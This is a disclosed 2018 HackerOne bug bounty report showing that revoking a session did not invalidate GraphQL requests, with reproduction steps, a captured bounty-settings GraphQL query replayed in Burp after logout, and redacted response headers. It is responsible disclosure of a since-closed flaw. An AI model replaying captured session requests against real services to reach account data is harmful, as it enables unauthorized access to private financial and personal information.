# Revoking user session in https://hackerone.com/settings/sessions does not revoke the GraphQL query session

## Report Details
- **Report ID**: 417382
- **URL**: https://hackerone.com/reports/417382
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-10-02T02:24:25.196Z
- **Disclosed**: 2018-11-30T19:21:17.498Z

## Reporter
- **Username**: japz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hi Team,

**Summary:**

I have found an Insufficient Session Expiration on implementation of the new `Revoke user session` feature of HackerOne here: https://hackerone.com/settings/sessions

**Description:**

The new __REVOKE__ session feature will destroy the session of the selected device, that means any request that requires authorization should not work (`POST`, `GET`) __BUT__ i have observed that you forgot the `GraphQL` query request, i can still query sensitive information despite i already revoke my current session and this can result a __sensitive information disclosure__  

### Steps To Reproduce

  1. Login to hackerone.com
  2. Go to sensitive page and capture the `GraphQL` request , on my case i captured the bounty settings `{"query":"query User_bounty_settings_page... etc` on this end point: https://hackerone.com/settings/bounties
  3. Send the GraphQL request to repeater
  4. Go to https://hackerone.com/settings/sessions and click `Revoke` to destroy the current session
  5. You will be logout to your account, means session destroyed
  6. Go back to burp repeater and click `Go` to repeat the graphql request
  7. Observed that you can still query the graphql `User_bounty_settings_page`, and it will disclosed the reports that was rewarded, including the amounts, report title, payment method used and other sensitive information.

__Below is my sample GraphQL query and response after revoking the session:__

```
{"query":"query User_bounty_settings_page($first_0:Int!,$currency_1:CurrencyCode!,$currency_2:CurrencyCode!) {\n  me {\n    id,\n    ...Fg\n  }\n}\nfragment F0 on PayoutPreferenceInterface {\n  default,\n  id,\n  __typename\n}\nfragment F1 on Node {\n  id,\n  __typename\n}\nfragment F2 on User {\n  tax_form {\n    url,\n    hello_sign_client_id,\n    status,\n    id\n  },\n  email,\n  bounties {\n    total_count\n  },\n  payout_preferences {\n    __typename,\n    ...F0,\n    ...F1\n  },\n  id\n}\nfragment F3 on CoinbasePayoutPreferenceType {\n  email,\n  id\n}\nfragment F4 on PaypalPayoutPreferenceType {\n  email,\n  id\n}\nfragment F5 on HackeronePayrollPayoutPreferenceType {\n  email,\n  id\n}\nfragment F6 on CurrencycloudBankTransferPayoutPreferenceType {\n  name,\n  id\n}\nfragment F7 on User {\n  payout_preferences {\n    __typename,\n    ...F0,\n    ...F3,\n    ...F4,\n    ...F5,\n    ...F6,\n    ...F1\n  },\n  id\n}\nfragment F8 on User {\n  _bounties4glIUB:bounties(first:$first_0) {\n    edges {\n      node {\n        id,\n        _id,\n        awarded_amount,\n        bonus_amount,\n        awarded_currency,\n        created_at,\n        status,\n        report {\n          _id,\n          title,\n          team {\n            name,\n            handle,\n            id\n          },\n          id\n        }\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  _bounties1CaoNY:bounties(currency:$currency_1) {\n    total_amount\n  },\n  id\n}\nfragment F9 on User {\n  _report_retest_usersixO8i:report_retest_users(completed:true,last:$first_0) {\n    completed_count,\n    edges {\n      node {\n        id,\n        completed_at,\n        report_retest {\n          report {\n            _id,\n            team {\n              handle,\n              name,\n              id\n            },\n            id\n          },\n          id\n        }\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  id\n}\nfragment Fa on User {\n  tax_form {\n    url,\n    status,\n    signed_at,\n    type,\n    id\n  },\n  id\n}\nfragment Fb on User {\n  id\n}\nfragment Fc on User {\n  _bounties3jJC5o:bounties(currency:$currency_2) {\n    total_amount\n  },\n  lufthansa_account {\n    id\n  },\n  id,\n  ...Fb\n}\nfragment Fd on User {\n  tax_form {\n    id\n  },\n  id,\n  ...Fb\n}\nfragment Fe on User {\n  lufthansa_account {\n    first_name,\n    last_name,\n    number,\n    id\n  },\n  id,\n  ...Fb\n}\nfragment Ff on User {\n  id,\n  ...Fb\n}\nfragment Fg on User {\n  id,\n  tax_form {\n    url,\n    id\n  },\n  ...F2,\n  ...F7,\n  ...F8,\n  ...F9,\n  ...Fa,\n  ...Fc,\n  ...Fd,\n  ...Fe,\n  ...Ff\n}","variables":{"first_0":100,"currency_1":"USD","currency_2":"XLA
```

__Response:__

```
HTTP/1.1 200 OK
Date: Tue, 02 Oct 2018 02:01:20 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: no-cache, no-store
Content-Disposition: inline; filename="response."
X-Request-Id: 5ffd271a-bccd-4105-8991-4ed97769b1a0
Set-Cookie: ███
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: enforce, max-age=86400
Content-Security-Policy: default-src 'none'; base-uri 'self'; child-src www.youtube-nocookie.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare
CF-RAY: 4633948f1bbba2f6-HKG
Content-Length: 24732

████
```

__PoC screenshot below:__

█████

## Impact

Insufficient Session Expiration can result to sensitive information disclosure.

Let me know if anything else is needed.

Regards
Japz

## Attachments
No attachments
